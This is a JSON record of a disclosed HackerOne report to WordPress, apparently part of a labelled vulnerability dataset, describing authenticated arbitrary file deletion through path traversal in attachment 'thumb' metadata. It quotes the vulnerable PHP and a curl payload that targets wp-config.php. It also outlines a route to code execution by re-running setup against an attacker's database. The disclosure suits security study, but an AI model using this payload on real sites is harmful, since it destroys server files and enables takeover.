{
  "reported_to": "WordPress",
  "reported_by": "b258ea62bf297b02afa9854 ",
  "title": "Arbitrary file deletion in wp-core - guides towards RCE and information disclosure",
  "content": "\nVulnerable place 1: wp-admin/post.php\n$newmeta['thumb'] is placed into DB not sanitized directly from user input.\nCode 371 Bytes\n1case 'editattachment':\n2    check_admin_referer('update-post_' . $post_id);\n3    // Don't let these be changed\n4    unset($_POST['guid']);\n5    $_POST['post_type'] = 'attachment';\n6    // Update the thumbnail filename\n7    $newmeta = wp_get_attachment_metadata( $post_id, true );\n8    $newmeta['thumb'] = $_POST['thumb'];\n9    wp_update_attachment_metadata( $post_id, $newmeta );\nVulnerable place 2: wp_delete_attachment\nThere we have $meta = wp_get_attachment_metadata( $post_id ); and below in the code:\nCode 639 Bytes\n1if ( ! empty($meta['thumb']) ) {\n2        // Don't delete the thumb if another attachment uses it.\n3        if (! $wpdb->get_row( $wpdb->prepare( \"SELECT meta_id FROM $wpdb->postmeta WHERE meta_key = '_wp_attachment_metadata' AND meta_value LIKE %s AND post_id <> %d\", '%' . $wpdb->esc_like( $meta['thumb'] ) . '%', $post_id)) ) {\n4            $thumbfile = str_replace(basename($file), $meta['thumb'], $file);\n5            /** This filter is documented in wp-includes/functions.php */\n6            $thumbfile = apply_filters( 'wp_delete_file', $thumbfile );\n7            @ unlink( path_join($uploadpath['basedir'], $thumbfile) );\n8        }\n9    }\nThis means we can craft any value from the wp-admin for thumb property and that value to be sent towards @unlink\nHow to reproduce:\nUpload image via media menu e.g. new\nGo to edit post (old fashioned way)\nGrad the id, _wpnonce and choose your payload ../../../../wp-config.php\nCraft your payload(set auth cookies, ua, referrers, ...):\nCode 260 Bytes\n1curl 'http://localhost/ripsa/wpvuln/wp-admin/post.php?post=[your_postid]&action=editattachment&_wpnonce=[yournonce]' -H 'place your client headers: ua, cookies in order to mimic the authenticated user ' -d 'thumb=../../../../wp-config-slavco.php' --compressed \nDelete the file from the admin\nImpact:\nRequires user that have permission to manipulate media files / posts\nHard to be spotted because: 2.1 Payload is deleted from DB 2.2 @unlink won't rise error in case of any failed attempts\nAffects many blogging/publishing, e-commerce, ... setups.\nAttack:\nDelete wp-config.php and relaunch wp setup with remote attackers db - RCE\nDelete .htaccess or any another index.html/index.php in order to disclose any stored data under web accessible directory\n\n",
  "severity": [
    9.9,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1535564820,
  "report_url": "https://hackerone.com/reports/291878",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Upload an image via the WordPress media menu."
    ],
    [
      2,
      "Edit the post to inject a malicious path (e.g., '../../../../wp-config.php') into the 'thumb' metadata using a crafted curl request."
    ],
    [
      3,
      "Delete the attachment to trigger the arbitrary file deletion via the unlink function."
    ]
  ],
  "vuln_description": "The vulnerability allows an authenticated user with media manipulation permissions to delete arbitrary files on the server by manipulating the 'thumb' metadata in WordPress attachments. This can lead to remote code execution or information disclosure by deleting critical files like wp-config.php.",
  "reason": "The attack involves multiple steps, including manipulating metadata and triggering file deletion, but the logic is straightforward once the metadata manipulation is understood. The interaction between the metadata update and file deletion is not overly subtle.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}